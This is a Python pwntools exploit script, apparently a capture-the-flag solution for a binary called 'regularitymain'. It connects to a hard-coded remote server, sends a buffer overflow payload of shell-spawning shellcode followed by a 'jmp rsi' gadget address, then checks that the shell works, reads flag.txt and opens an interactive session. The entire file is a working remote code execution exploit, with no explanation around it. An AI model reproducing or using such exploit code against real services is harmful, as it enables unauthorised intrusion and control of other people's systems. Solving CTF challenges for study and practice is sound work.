from pwn import *

# Replace these with actual server details
REMOTE_HOST = '94.237.59.63'  # Replace with the IP address or hostname of the remote server
REMOTE_PORT = 56902  # Replace with the port number of the remote server

# Connect to remote server
p = remote(REMOTE_HOST, REMOTE_PORT)

elf = context.binary = ELF('regularitymain', checksec=False)

JMP_RSI = next(elf.search(asm('jmp rsi')))

print("[DEBUG] Connected to remote server")

# Craft the payload
shellcode = asm(shellcraft.sh())
payload = flat({
    0:      shellcode,
    256:    JMP_RSI
})

print("[DEBUG] Sending payload")

# Send the payload to the server
p.sendlineafter(b'days?\n', payload)

print("[DEBUG] Payload sent")

# Give the server some time to process the payload and spawn the shell
p.clean()  # Clear any existing data in the buffer
p.sendline(b'echo PWNED')  # Simple check to see if the shell is active

if b'PWNED' in p.recvline(timeout=5):
    print("[DEBUG] Shell successfully spawned")

    # Send command to read the flag
    p.sendline(b'cat flag.txt')

    # Receive the output
    flag = p.recvline(timeout=5).strip()
    print(f"Flag: {flag.decode()}")

else:
    print("[ERROR] Failed to spawn shell or execute commands")

# Switch to interactive mode to interact with the shell
p.interactive()
